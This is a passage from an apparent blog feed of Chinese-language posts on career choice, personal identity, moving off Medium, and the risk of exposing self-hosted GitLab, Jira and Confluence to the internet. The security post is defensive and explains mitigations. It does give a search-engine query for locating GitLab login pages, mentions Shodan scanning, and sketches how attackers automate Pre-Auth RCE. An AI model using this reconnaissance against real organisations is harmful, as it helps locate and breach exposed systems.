href="/2020/04/26/i-dont-know-what-i-want-about-career-383bee0be733/">關於求職，連我自己都不知道我要什麼</a>》一文中可以看出，其實我自己也不知道該怎麼選擇：</p><blockquote><p><em>在求職的時候，有一些問題很常被問到，像是：</em></p></blockquote><blockquote><p><em>1. 你這次求職想看一些什麼類型的公司？</em></p></blockquote><blockquote><p><em>2. 你的職涯規劃是什麼？</em></p></blockquote><blockquote><p><em>3. 你在工作上的目標是什麼？</em></p></blockquote><blockquote><p><em>有些問題我以為我知道答案，但沒有，我不知道。</em></p></blockquote><blockquote><p><em>舉例來說，一開始我都說這次求職沒有特定喜好，想要到處看看，所以公司類型都可以。想要到處看看是真的，但是都可以是真的嗎？這次也看了博奕業，但如果拿到 offer，我真的會去嗎？可能不會。如果公司很遠在南港，我會去嗎？也可能不會。</em></p></blockquote><blockquote><p><em>一開始也看了滿多小公司，直到真的面試之後才發現，小公司我真的 ok 嗎？還是我這次其實想要找比較大一點的公司？我不知道。</em></p></blockquote><blockquote><p><em>沒有限制是一種自由，但也是一種困擾。</em></p></blockquote><blockquote><p><em>你想找什麼職位？資深前端工程師？好啊。那如果有 team leader 的位置呢？好啊，也可以試試看。那如果是全端呢？好啊，我也不排斥。到處看看是好事，問題是最後要怎麼做選擇。因為最後能選的只有一個，沒有什麼我全都要這種事，很多工作條件是互斥的，不相容就是不相容。</em></p></blockquote><p>如同我開頭所講的，我覺得選擇本來就是一件很個人的事情，別人的最佳選擇不一定是你的。而以我的個性來說，我相信所有的選擇都是好的選擇，相信每一個選擇都有價值，也相信自己有能力<a href="/2019/10/11/change-43bb422a30ed/">改變環境</a>。我不相信有什麼「一失足成千古恨」的選擇，就算真的有「比較差」的選擇，我也覺得自己能換個角度從中得到收穫。</p><p>所以對於選擇這件事情，如果以我自身出發，我通常給不了什麼好建議。我講出來的話大概都是：「不錯啊，可以試試看」或是「OK，沒什麼問題」之類的，因為我是真的覺得問題不大。</p><p>但如果直接把這一套用在學生上面，似乎就會顯得失去了身為一個導師的價值。對於職涯選擇的問題，我期望自己應該要能給出更有價值的答案，或是對他們更有幫助的答案。</p><p>大多數人都害怕選錯，都希望選到價值最高的那個，但是怎樣才叫做價值高？薪水高嗎？那如果薪水很高可是都用一些很偏門的技術，導致下一份很難找呢，這樣算是價值高嗎？</p><p>為了避免在這個問題打轉太久，我就先把價值定義成是「對自己成長性最有幫助」好了，從這個價值觀出發，有兩條路我都覺得不錯。</p><p>第一條是我以前的老路，進入一間你做的事情會很雜的公司。你或許會寫一點後端，也會寫前端，甚至寫到 App 去也都有可能。會推薦的原因有三個，第一個是我親身經歷過以後覺得這樣滿也幫助的，第二個是如果你對於職涯還沒有明確的規劃，都先做做看也不錯，再看看自己喜歡哪個。第三個是假設你真的很篤定要走前端，那你未來很有可能碰不到其他領域的東西了，如果不趁著第一份工作玩玩看，之後工作上就玩不到了。</p><p>第二條則是直接往想要的方向走，例如說想做前端的話就專門去做前端，只要認真工作個一兩年，大概就能把前端的技能練到一個深度，跟第一條路相比，這一條路在前端上的專業技能會更多也更深一點，但就是缺乏了一些廣度，我也不確定之後能不能補得回來。</p><p>在團隊型態跟工作方式上，最理想的形式應該是有制度化的，例如說有個完整的開發流程，跑個 scrum 然後各種 meeting 都有開，上版也很有制度，開發上也有 code review，團隊裡面還有資深的前輩可以指導，這樣當然是最理想的形式。</p><p>我自己是一直到最近兩間公司才有比較完整的開發流程，也是這時候才知道原來完整的流程是長這樣。雖然說完整的開發流程並不代表比較快，也不代表比較好，但好處是你可以先知道全貌長什麼樣子。未來到了小公司或是新創公司，你可以決定是否導入這套流程，就有一個依據可以參考。</p><p>理想的開發環境很少，因此競爭的人也多，需要衡量自己是否願意為了這個機會付出更多時間在找工作上面。我自己的建議會是設個停損點，例如說一兩個月沒找到就先去上班了，等你磨練個一兩年之後，進這些公司的機會就變大了，就可以再去挑戰一次。</p><p>對於轉職的人來說，無論去哪間公司都會學到東西，花三個月等一個理想中的 offer，不如先花三個月去上班看看軟體工程師的工作長什麼樣子。</p><p>在談選擇的時候，害怕選錯背後的原因大部分都是因為重新選擇的成本很高，例如說魷魚遊戲的那個二選一踩玻璃好了，選錯就掉下去，就會很害怕選錯。但如果選錯只是退到上一格呢？應該就不會害怕選錯了，因為選錯的成本很小。</p><p>在工作上也是這樣的，選錯的成本可能沒有你想像中的高。我身邊就有幾個進了公司可能幾天或是幾週就發現不適合，立刻辭職然後找尋新工作的案例。很多事情真的只有進了公司才會知道，面試的時候再怎麼相談甚歡，都不如工作個一兩天來得實際，有些可能面試聽起來都不錯，進來才發現一團糟，或也有可能相反，面試不怎麼樣，進去發現是天堂。</p><p>在現今軟體相關的工作需求還是滿多的，因此選錯頂多就是辭職開始找下一份工作，對自己跟對公司來說即時止損都是不錯的選擇，既然不適合就沒必要勉強繼續待著。</p><p>好了，這篇寫到這邊我也不知道自己想表達什麼。我一開始寫這篇本來標題取叫：「工程師的第一份工作該怎麼選？窩不知道」，後來想想應該還是有些建議跟面向可以參考，就改成現在的標題了，但寫一寫還是發現這個主題我寫得滿差的。</p><p>追究於其根本原因，我想還是因為我自身的價值觀吧，我相信不管去哪個環境都可以學到東西，而「繞遠路」也不一定是真的繞，看似繞路的那些足跡，或許在未來會成為不可或缺的助力。只要能夠幫助自己成長，我都認為是好的選擇。</p><p>最後還是給出幾個在選擇工作時可以先問自己的問題做個總結：</p><ol><li>你理想中的工作型態是什麼？</li><li>你討厭的工作型態是什麼？（通常要工作過才講得出來就是了）</li><li>你在這一份工作想獲得什麼？假設一年後離職了，你的履歷上想要有什麼成就？</li><li>你未來三年的職涯規劃是什麼？你的履歷想長什麼樣子？</li><li>你目前猶豫的點是什麼？是害怕選錯以後成本很高嗎？</li></ol>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>想變成的模樣</title>
      <link href="/2021/10/30/wannabe-f24dca839d27/"/>
      <url>/2021/10/30/wannabe-f24dca839d27/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/wannabe-f24dca839d27/0__4f9lK7HkWbcIM__D5.jpg"></p><p>我覺得一定是因為以前看太多不現實的動漫畫的關係，我最嚮往的角色是那種「好像什麼都知道，但卻又被他說得雲淡風輕」的那種人。例如說他去參加全民星攻略答題，每一題都答得出來，而主持人問他為什麼，他就只回答說：「噢，就之前剛好好奇去查有點印象」，就好像柯南一樣，在夏威夷學習了各種剛好能派上用場的技能。</p><p>「冷知識」就是這樣的一個東西，知道了以後有九成時間沒什麼用，但只要等到那一成，別人就會用一種：「哇，你怎麼連這個都知道」的神情看著你。高中有一陣子因此沈迷於國學冷知識之中，還因此提升了對於國文的好感，不過已經忘了大半。</p><p>知道冷知識不難，但要保存在記憶中卻不容易，去紫禁城時若是我還記得學過半年的滿文，就可以大顯身手，但事實是我全都忘光了，只記得「傳位于四子」這個從滿文的觀點來看就可以輕鬆破解的謠言。</p><p>除此之外，我也很喜歡看那種「比動漫畫更誇張」的故事，例如說大谷翔平，二刀流能投能打，明明是投手但卻是全壘打王的熱門競爭者（可惜最後沒得），真的是誇張，笑死。或者是 <a href="https://www.sohu.com/a/327556245_670627">Geohot</a>，破解 iPhone 又破解 PS3，打 CTF 一人參戰還<a href="https://www.ithome.com.tw/news/89794">技壓全場</a>。</p><p>我喜歡看這種故事，或許是因為從這些故事中可以知道，有些事情可能不是做不到，而是我們被自己的想像力給限制住了。也或許是因為知道自己離他們太遙遠，所以以一種崇拜的眼光在看著他們。</p><p>其實會有這篇文章的原因之一，是因為我一直在想，我想成為怎麼樣的人，想變成什麼模樣。跟其他有相似名氣的人比起來，我的曝光率應該算是偏低的，幾乎沒什麼在出席一些活動。</p><p>我很嚮往那種「低調的強者」的感覺，低調指的是幾乎不出席公開活動，所以幾乎也沒人知道他長什麼樣子，說起話來的腔調如何，而強者則是因為他的作品，從作品中就可以看出他很厲害。像是掃地僧那樣，強到爆炸但從外表看不出來，或是那種隱於市的武林高手，明明就很強，但看起來跟一般人沒兩樣。</p><p>這樣講起來，可能我真正喜歡的其實是「反差感」？喜歡那種反差所帶來的衝擊以及驚喜。</p><p>人生中第一場的公開技術演講是 2018 的 <a href="https://modernweb.tw/2018/">Modern web</a>，是主動投的，投的原因是「沒有當過技術 conf 的講者，好酷，可以試試看」，第二場是 2020 的 <a href="https://2020.jsdc.tw/">JSDC</a>，這次是被邀請的，答應的原因是「沒講過 JSDC，可以試試看」。而今年要給的兩個演講，也是相似理由，一個是沒講過，一個是「一次出現在兩場演講給兩個不同的主題，應該很酷吧」。</p><p>我其實不喜歡拋頭露面，這也是為什麼我的第一堂線上課程是不露臉的。之所以後來違反了這個原則，是因為課程影片右下角有人臉，確實是比較抓得到學生的注意力，影片看起來也不會這麼無聊。話說韓國跟中國不是有什麼蒙面歌王跟蒙面舞王嗎？可以辦個「蒙面程式王」嗎？找十個蒙面的工程師上去比賽 coding，大家可以從 coding style 跟 IDE 的使用上來猜猜看是哪個工程師去參賽。</p><p>「沒試過試試看」是我做許多事情的主因，就嘗試一下，至少有試過了。接業配也是同樣的理由，不是因為錢，是因為「好酷欸居然可以接業配了」，是一個我覺得滿有趣的經歷。</p><p>如果可以讓我再選一次，我還是會用 Huli 這個其實就是我本名的暱稱，但這次不透露任何公開資訊了。所以會有一堆人讀過我的文章，但從來都沒看過本人，也搜尋不到任何公開的經歷，超級低調而且超級神秘。面試時我也不會把部落格放到履歷上，當我答錯某題 JS 的題目時，搞不好面試官還會說：「想更深入了解的話可以參考一下 Huli 的部落格，寫得還行」</p><p>感覺很酷，但從現實看不可能達成，第一是名氣基本上不可逆，除非過氣（但這只是新人不認識你，舊人還是認識），第二是現在想做也已經來不及了，我懶得開新的帳號。</p><p>講到名氣，這點我之前在其他文章中好像談過，名氣對我來說只是寫作的副產品，並不是因為我想讓大家都知道我的存在才開始寫東西，而是因為我想寫東西，而我寫了之後漸漸開始有一些人知道我的存在。就像有些 YouTuber 拍片的初衷就是為了想紅，但有些真的只是想分享生活，變紅不是他們的本意。</p><p>名氣確實帶來不少好處，發的文比較多人按讚，面試比較多東西可以聊，技術研討會比較有機會收到當講者的邀請。但壞處大概就是類似冒牌者症候群的東西，以及擔心自己成為<a href="https://blog.kalan.dev/2020-10-27-weird-expert-da-da/">大神文化</a>中享受著名氣而不是實力帶來的掌聲，漸漸腐化的可能性。</p><p>之前曾經找我諮詢過的一個讀者跟我說，像我這樣的經歷跟故事，應該讓更多人知道，影響到更多人。雖然很感謝他的賞識，但這不是我想要走的路。如果要幫自己貼標籤，「哲學」、「大學休學」、「海外工作」這些看起來都是會吸引到更多人的東西——畢竟一堆內容農場式標題就是這樣的。</p><p>但如果大家有注意到，我在大約半年到一年前在自我介紹中把這些東西全部都拿掉了。我以前一直以為自我介紹就是把自己那些吸引人的標籤全都貼出來，就像是 Linkedin Profile 一樣，但後來我才意識到，自我介紹可以是「你想要其他人怎麼認識你」。</p><p>我不想要大家以那些標籤認識我，因為我根本不覺得那些有什麼。那些對我來說就只是一段普通的經歷，就算我寫出來也不是因為我覺得這有什麼，只是因為我想寫出來，我想把自己的經歷記錄起來。我也不在乎那些經歷對你是否會有任何啟發，因為我的本意只是記錄而已。</p><p>所以後來我把自我介紹改成現在的版本，不談過往吸引人的標籤，不談世俗會有興趣的經歷，不談職位跟年資，只談自己想介紹的那一個部分。</p><p>如果真的需要介紹那些經歷，在「過度包裝」跟「妄自菲薄」的光譜之間，我選擇傾向後者更多一點。因為過度包裝而被踢爆的案例有太多太多，簡介寫得飛上天，實際上卻相去甚遠，做事能力差到不行。「對自己誠實」對我來說是件很重要的事情，我寧可少講一點，也不願意多講一點。</p><p>對很多人來說，「把事情做大」跟「攀升到上層階級」似乎是不證自明的公理，人生就是要這樣啊，不然要幹嘛。但我在第一點上正好相反，我不喜歡把事情規模化。我認為有些東西做大以後，雖然能影響更多人，或是賺到更多的錢，但會失去當初還很小的時候，一些很重要的東西。或許是初衷嗎？我也不知道，可能不是，總覺得規模化後保持初衷是做得到的。</p><p>如果我開雞排店，我想開那種我家巷口屌打的雞排店，雖然客群不多，總是同一類人，但生意可以養活自己，品質也被顧客們稱讚。就這樣一直開在巷口，不會變成連鎖店，也不會擴展分店。我覺得這樣子就很夠了，做好自己能做到的事情。</p><p>而金錢的部分，我也是覺得夠用就好。那這個夠用對每個人的定義都不一樣，有人的財富自由是存到一億，也有人存到一千萬就覺得可以稱作是財富自由了。之前忘記在哪看到一句話，我覺得滿有道理的：</p><blockquote><p><em>與其想著要賺更多更多錢，還不如降低物慾比較實在</em></p></blockquote><p>如果財富可以到每次出國都頭等艙，台灣各縣市都有豪宅，各種高級禮遇，金錢能搞定的問題都不是問題，這樣好嗎？當然好，怎麼可能不好。但要達成這個目標，勢必是要付出相等的努力，那我願意付出那些努力嗎？</p><p>不願意，我好懶。</p><p>對我這種懶人來說，比起花力氣去思考怎麼賺更多的錢，降低物慾還比較實在。現在的生活環境對我來說就已經可以了，偶爾買買特價的商務艙已經是生活中的小確幸，可以帶來足夠的快樂，沒什麼不好的。</p><p>而我其實也沒想過財富自由這件事情，我也沒想過有什麼退休生活。對我來說，目前為止我都還是快樂地工作，做著自己想做的事情。哪天真的不工作了，可能一時之間我也不知道要幹嘛。換句話說，我覺得工作對我來說就是一種生活，就是一種休閒娛樂（這代表我是一個工作狂嗎？我覺得不是）。</p><p>就像寫作一樣，有些人的休閒娛樂是打棒球，有些人的興趣是看電影，而剛好我的休閒娛樂跟興趣就是寫部落格。</p><p>這篇好像放了兩三個月都沒有發出來，主要原因是我覺得這篇表達得沒有很好，有些東西有寫到點，但有些又沒有。於是想了又想，修了又修，最後想說再不 po 的話可能要放到明年了，就這樣發出去好了。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Medium 上寫技術文章，你確定嗎？</title>
      <link href="/2021/10/25/do-you-really-want-to-write-tech-blog-on-medium-3dd25640f26c/"/>
      <url>/2021/10/25/do-you-really-want-to-write-tech-blog-on-medium-3dd25640f26c/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/do-you-really-want-to-write-tech-blog-on-medium-3dd25640f26c/0__9ORUsG5qbgYuKoR8.jpg"></p><p>這篇想表達的東西就跟標題一樣，是一篇 Medium 勸退文。</p><p>Medium 方便、簡單、多人協作容易（Publication），而且 SEO 又好，自然而然是很多人寫部落格的首選，像我自己也在上面寫了不少文章。如果是非技術文章的話，我認為 Medium 確實是不錯的選擇。</p><p>但對於技術部落格來說，大家都知道這不是一個合適的地方。像是不支援 Markdown 語法（我知道有這個<a href="https://markdowntomedium.com/">轉換器</a>可以用），對於程式碼的顯示也沒有原生支援，需要透過 gist 或是圖片的方式才能放進來（我也知道可以透過轉換器自動幫忙產生 gist）。</p><p>除了這些大家都知道的、顯而易見的缺點，其實還有一些東西需要考慮。</p><p>先講結論，如果你只是想短期試試水溫，「讓自己先願意寫」是首要考量，那 Medium 是個好選擇，因為它簡單方便，上手門檻低，能讓你先專注在寫作這件事情身上。</p><p>可是如果你想長期發展技術部落格，那我不會推薦 Medium，理由如下。</p><h4 id="1-SEO-雖然好，前提是你要達到一定門檻"><a href="#1-SEO-雖然好，前提是你要達到一定門檻" class="headerlink" title="1. SEO 雖然好，前提是你要達到一定門檻"></a>1. SEO 雖然好，前提是你要達到一定門檻</h4><p>Medium 自從某次改版以後，對於沒有達到一定門檻的文章，會直接賞你一個 noindex，意思是搜尋引擎不會把你的網頁收錄進去，所以在 Google 上面會完全搜尋不到那篇文章，你直接拿標題去搜尋也不會有結果。</p><p>詳情可參考：<a href="https://medium.com/kung-%E7%9A%84%E6%97%A5%E5%B8%B8/medium-%E6%96%87%E7%AB%A0%E5%9C%A8-google-%E4%B8%8A%E6%B6%88%E5%A4%B1%E4%BA%86-%E9%97%9C%E6%96%BC-medium-%E7%9A%84-seo-%E6%96%B0%E6%94%BF%E7%AD%96-b05f99b2f372?sk=68d4599717077ab2fd625f265bb70832">Medium 文章在 Google 上消失了？關於 Medium 的 SEO 新政策</a></p><p>至於這個門檻到底是什麼，我猜是作者要 follower 數量大於 100，或者文章有一定的瀏覽量之類的，但我只是猜測而已。總之，在你的文章享受 SEO 紅利之前，你必須先找其他管道推廣，才有機會達到門檻。</p><h4 id="2-內容無法客製化"><a href="#2-內容無法客製化" class="headerlink" title="2. 內容無法客製化"></a>2. 內容無法客製化</h4><p>Medium 本來的客群就不是技術部落格，所以它的編輯器功能也很有限，就那幾種而已。就像前面說過的，貼 code 一定要透過第三方，像是先把 code 貼到 gist 再引入進來，如果只有兩三篇文章這倒是還好，如果有二十篇，你會累死。</p><p>就算是用一些現成的轉換器（或甚至自己寫），也還是有些東西無法支援，例如說 iframe，有些網頁相關的文章如果有支援 iframe，你就可以直接把 demo 的網頁嵌入進來，但是這邊不行（或許有支援 codesandbox 或是 codepen 之類的，但那終究不是自己的網頁）</p><p>總之呢，在 Medium 你就會受制於 Medium 的編輯器，他不給的你沒辦法用，對用不到的人來說是一種方便，對其他人來說則是一種限制。如果是技術部落格，我相信限制一定是多於方便的。</p><h4 id="3-搬家困難"><a href="#3-搬家困難" class="headerlink" title="3. 搬家困難"></a>3. 搬家困難</h4><p>在搬家的時候，最重要的有兩點，第一點是文章的輸出，沒記錯的話 Medium 匯出的應該會是比較偏向 HTML 格式的資料，就算有人提供 Markdown 的轉換，依然需要手動調整一些細節。</p><p>第二點是轉址，SEO 不想弄爛的話，轉址就要弄好，但是 Medium 會讓你轉址嗎？不會，他沒有這個功能。雖然他可以設置 canonical url，但那跟轉址還是不同的東西，是兩回事。</p><p>而且我有試過 canonical url，設置完之後過了兩個月，還是只搜得到 Medium 上面的文章，搜尋不到 canonical 指向的地方…（或許是我設置錯誤，或是新的網站權重太低？）</p><h4 id="4-缺少分類以及索引功能"><a href="#4-缺少分類以及索引功能" class="headerlink" title="4. 缺少分類以及索引功能"></a>4. 缺少分類以及索引功能</h4><p>如果今天不是 publication 而是個人作者，是沒有分類這個功能的。</p><p>再者，很多部落格都會有 Archive 這個頁面，可以很快速地看到這個部落格上面所有的文章，Medium 有這功能嗎？沒有。</p><h4 id="5-缺少統計資料"><a href="#5-缺少統計資料" class="headerlink" title="5. 缺少統計資料"></a>5. 缺少統計資料</h4><p>我在空閒時間最喜歡看的兩個網站一個叫 Google Search Console，可以看到大家用哪些關鍵字找到我的部落格；第二個叫 Google Analytics，看一下流量怎麼樣，來源的分佈如何，也可以找到參考來源網址，看看被哪些網站引用了。</p><p>但 Medium 不支援這些東西（早期好像有支援，後來拔掉了），它只有自己原生的統計資料後臺。</p><p>看完以上五點，有些人可能會想說：「搞不好以後會有這些功能啊，像是統計資料的後台不是就更新過嗎，publication 功能也越來越多了」</p><p>確實是這樣沒錯，但這樣的話你的部落格發展就會受到平台的限制，以長期經營來看，我不覺得是件好事。</p><p>那該怎麼辦呢？</p><p>如果想長期經營技術部落格，最推薦的方式當然就是自架。你可以考慮許多人用的 <a href="https://hexo.io/zh-tw/">hexo</a>，也可以考慮我用過滿意度很高的 <a href="https://blog.huli.tw/2021/08/22/eleventy-over-hexo/">eleventy</a>，總之呢，選擇有很多種。</p><p>好處很明顯，就是所有的事情都是你可以掌握的。樣式想改就改，放程式碼也超容易，搬家也超容易因為都是 markdown 格式，而網址的部份因為也是自己的，所以要設定轉址也是沒有問題的。</p><p>前面所說的 Google Analytics 跟 Google Search Console，也都可以自己設置，完全沒有問題。</p><p>雖然說 SEO 剛開始可能差了點，但長期經營以後還是有機會爬到很前面的位子。</p><p>一開始也不需要直接切過去，有許多從 Medium 搬走的人都是採取兩邊同時發文的策略，然後用 canonical 指到自己的部落格那邊，Medium 變成只是一個文章的露出管道，而不是主力。</p><p>但總之，你必須要先有一個自己的部落格才行。</p><p>有了自己的技術部落格，你才有完整的掌控權，你不用怕 Medium 改規則文章搜尋不到，不用怕 Medium 倒掉文章會全部不見，不用怕搬家很難也不用擔心不支援 markdown 格式，更不用擔心貼 code 很麻煩。</p><p>總之呢，如果長期經營技術部落格的打算，我是不推薦 Medium 的。</p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服務對外但需要登入，能有什麼風險嗎？</title>
      <link href="/2021/10/10/risk-of-service-exposure-a873d3418d99/"/>
      <url>/2021/10/10/risk-of-service-exposure-a873d3418d99/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/risk-of-service-exposure-a873d3418d99/0__9JN71UTxZ6xMbGB7.jpg"></p><p>在開發產品的時候，常常需要搭配各種工具作為輔助，例如說用 GitHub 管理程式碼，或者是用自己架的 GitLab。在專案管理的部分，也有些人會選擇用自己架的 JIRA 或是 Redmine，這些都很常見。</p><p>雖然這些服務通常都會有 cloud hosting 的方案，但比較常看到的是自己把服務架起來。畢竟有些是開源的專案，自己架起來省了不少成本，而有些公司的考量則是希望資料掌握在自己這邊，而不是別人的雲上面。</p><p>在最理想的情況之下，這些服務應該是不會對外的。意思就是，只有公司內網的 IP 可以連結到這些服務，如果不在公司內，就是透過 VPN 才能存取到，確保外面的人看不見這些服務。</p><p>但實際的狀況卻是，有些公司並沒有把這些服務隔離在內網（或搞不好根本沒想到要這樣做？或可能是有什麼實作上的困難），因此在外網就可以直接看見這些服務。</p><p>這樣會有什麼問題嗎？</p><p>最糟的狀況就是權限管理沒有做好，讓這些服務甚至不需要登入就可以存取，如此一來，公司內部的資訊就直接暴露在外。如果暴露的服務是 GitLab，程式碼就會跟著曝光，或有些敏感資訊例如說帳號密碼也有可能跟著曝光。</p><p>看到這邊你可能會想說：</p><blockquote><p>不可能吧，有公司會這麼不小心連權限都不鎖嗎？</p></blockquote><p><a href="https://zeroday.hitcon.org/">HITCON ZeroDay</a> 是一個台灣的漏洞回報平台，在上面回報的漏洞會給廠商足夠的時間修補，接著過一陣子以後就會對外公開，上面可以直接搜尋有人回報過的漏洞，這是搜尋 GitLab 的結果：</p><p><img src="/img/risk-of-service-exposure-a873d3418d99/1__zFAXT1hVhaA8Z5M__tEVX__A.png"></p><p>這只是其中一部分的搜尋結果，如果好奇全部的搜尋結果，可以自己去網站上面試試看，看看有哪些公司有過類似的問題。</p><p>GitLab 存取控制缺陷，就代表不需要登入也可以看到裡面的 project，無論是程式碼還是各種相關文件，全部都會被人看光光。</p><h3 id="這些服務是怎麼被找到的？"><a href="#這些服務是怎麼被找到的？" class="headerlink" title="這些服務是怎麼被找到的？"></a>這些服務是怎麼被找到的？</h3><p>看了上面的截圖，你會好奇的第一個問題可能就是這個。</p><p>他們是怎麼找到這些服務的？難道是這些公司的員工自己來回報嗎？不然照理來說應該不會發現這些服務才對？</p><p>不不不，答案或許比你想得更簡單。</p><p>GitLab 的登入頁面預設的標題是「Sign in · GitLab」，所以只要運用一點 Google 的搜尋技巧，就可以找到網址有 tw 的 GitLab 登入頁面：「intitle:Sign in · GitLab inurl:tw」</p><p><img src="/img/risk-of-service-exposure-a873d3418d99/1____5JHIE3yMUPTeac6p6fnvg.png"></p><p>這只是其中一種方法而已，是最方便快速的方法，但能找到的資料有限。另外一種方法則是利用其他一些網站——專門在搜集資訊的網站。</p><p>有些網站會去掃描每一個 IP 或是新註冊的網域，去掃他們的每一個 port，然後根據 response 來決定它可能是哪個服務，這些資訊可能存在於 response header 或是 body 的任何地方。有了這些資料以後，就可以做跟剛剛類似的事情，直接去搜尋資料庫裡面有哪些 IP 有 GitLab 這個服務，有些更精準的甚至可以指定版本。</p><p>例如說 <a href="https://www.shodan.io/">Shodan</a> 就是這樣的一個網站：</p><p><img src="/img/risk-of-service-exposure-a873d3418d99/1__aEe8Rv0y5b4P097dxk8fLQ.png"></p><p>如果需要的話，還可以指定更精準的條件，例如說「在台灣的 GitLab 服務」之類的，就會跑出一長串清單，但這類型的網站靠的是查詢來賺錢，所以想看更多資料的話就必須付錢。</p><p>想了解更多這種服務的話，可以參考我同事寫的：<a href="https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/">駭客起手式 : Shodan &amp; Fofa</a>。</p><p>總之呢，只要你的服務暴露在外網，就很有可能被探測到，被收錄進去某人的資料庫裡面。所以千萬不要想著「我又沒有特別宣傳這網站，怎麼會被發現」，光是有 public IP 這一點，網站就已經被發現了。</p><h3 id="可是我的服務需要自家信箱才能登入，這樣就沒問題了吧？"><a href="#可是我的服務需要自家信箱才能登入，這樣就沒問題了吧？" class="headerlink" title="可是我的服務需要自家信箱才能登入，這樣就沒問題了吧？"></a>可是我的服務需要自家信箱才能登入，這樣就沒問題了吧？</h3><p>前面提過最糟的狀況就是權限沒有控管好，開放訪客註冊或是根本不需要註冊，而最好的情況當然就是服務不對外，隔離在內網裡面。而在這兩者之間的狀況就是標題所提到的：「服務對外，但需要登入」。</p><p>因為需要登入，而駭客不知道帳號密碼，既然無法登入就看不到東西，也無法達成任何攻擊，造成任何損害。</p><p>真的是這樣嗎？</p><p>通常是這樣沒錯，除非你用的這個服務本身就有漏洞，而且這個漏洞不需要登入就可以觸發，這類型的漏洞通常被稱為 Pre-Auth 的漏洞，儘管沒有登入，但只要能存取到這個服務，就能利用這個漏洞。</p><p>應該有不少人都有用過 Jira 吧？Jira 在 2019 年 7 月時有過一個編號是 <a href="https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html">CVE-2019–11581</a> 的漏洞，是 Pre-Auth RCE，Pre-Auth 指的是不需要登入，RCE 指的是 Remote Code Execution，意思就是這個漏洞能夠讓攻擊者在系統上執行任意指令，是很嚴重的漏洞。這個漏洞只要有開 contact administrator 的功能就會中招。</p><p>另外呢，Jira 背後的公司 Atlassian 推出的另外一個服務 Confluence，在今年八月也爆出了一個 Pre-Auth RCE，編號為 <a href="https://www.ithome.com.tw/news/146555">CVE-2021–26084</a>，這次不需要特別開什麼設置就會中招。</p><p>換句話說，上面這兩個漏洞基本上就是只要你服務對外，就有遭受到攻擊的風險，無論你有沒有鎖登入功能都一樣。</p><p>這就是服務對外的風險，只要這個服務本身存在著 Pre-Auth 的漏洞，攻擊者就可以在未登入的狀況下進行攻擊。</p><p>接著許多人的下一個問題可能是：</p><blockquote><p>我們公司又不有名，應該不會有人來打吧？</p></blockquote><p>這就不一定了，因為搞不好「打你的人也不知道自己在打的是誰」，還記得我前面說過的 shodan 搜尋引擎嗎？</p><p>假設今天我是一個攻擊者，而且想讓效益最大化，我一定是先去上面搜尋符合條件的主機，然後把清單撈下來以後直接把攻擊自動化，先寫好一個腳本，利用這個漏洞讓遠端的主機跑挖礦程式什麼的，接下來只要啟動腳本，就會自動去攻擊每一台主機。</p><p>因此，我根本不會知道那些主機是誰的，因為我也不需要知道。</p><p>來簡單總結一下：</p><ol><li>只要你的主機有著 public IP，就能夠被找到</li><li>承上，如果架的服務有 Pre-Auth 的漏洞，就很容易遭受到攻擊</li></ol><p>最根本的解決方法就是把這台主機隔離在內網，讓外界存取不到，或者是防火牆設定好，只允許特定的 IP（通常是來自公司的 IP）存取 。除此之外，也還是要頻繁更新版本，避免使用到有漏洞的版本，讓攻擊者無機可趁。</p><p>如果真的因為一些原因要對外，至少在前面擋個 WAF（Web application firewall），有些 WAF 的反應速度很快，可以站在最前線把一些惡意的 payload 擋掉，例如說 Cloudflare：<a href="https://blog.cloudflare.com/how-cloudflare-helped-mitigate-the-atlassian-confluence-ognl-vulnerability-before-the-poc-was-released/">How Cloudflare helped mitigate the Atlassian Confluence OGNL vulnerability before the PoC was released</a></p><p>文章內提的 Pre-Auth 漏洞都是嚴重性極高的 RCE，而這種 Pre-Auth RCE 的頻率沒那麼高，比起 RCE，更常出現的是一些大大小小的漏洞，例如說洩漏 user 的 email 啦，或是任意讀取檔案啦之類的，雖然說危害程度沒有 RCE 這麼大，但依然是個風險，依然是個需要修補的漏洞。</p><p>最後，若是你對這類型的資安主題有興趣，除了追蹤這個 Medium 帳號以外，也可以追蹤 <a href="https://tech-blog.cymetrics.io/">Cymetrics Tech Blog</a>，我跟幾個同事們都會在那上面寫資安相關的文章。</p>]]></content>
      
      
      <categories>
          
          <category> 技術白話文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技術白話文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>對於教學的反思</title>
      <link href="/2021/10/02/teaching-reflection-a1cbf3ae1997/"/>
      <url>/2021/10/02/teaching-reflection-a1cbf3ae1997/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/teaching-reflection-a1cbf3ae1997/0____VOYSRKG8nx4khRP.jpg"></p><p>做了更長一陣子的教學之後，收穫之一是更能理解以前學生時期碰過的老師，為什麼會有那些行為。我相信有許多人都碰過自己不喜歡的師長，有可能是不喜歡他的態度，或是不喜歡他的教法，而我開始漸漸理解為什麼他們會變成那樣，因為我可能也有一部分正在變成那樣。</p><p>但至少，現在的我還沒有 100% 被同化，我可以理解，但不代表我認同。我會盡力讓自己不要變成那樣。</p><h3 id="經驗所帶來的認知不對等"><a href="#經驗所帶來的認知不對等" class="headerlink" title="經驗所帶來的認知不對等"></a>經驗所帶來的認知不對等</h3><p>身為老師，對自己的教學內容一定是再熟悉不過，會知道自己教了哪些東西，以及哪些東西是重要的。而一個常犯的失誤就是，會一股腦地把自己認為的重點全部都塞進課程。</p><p>教學並不是你教了多少，學生就會學多少。它比較像是一個漏斗，就是看轉換率最喜歡用的模型，瀏覽人次是 100 人，可能點了購買按鈕的只剩 10 個，最後購買的只有 1 個。每一個環節都會有所損耗，不太可能來 100 人，就真的 100 人都完成購買。</p><p>教學也一樣，我講了 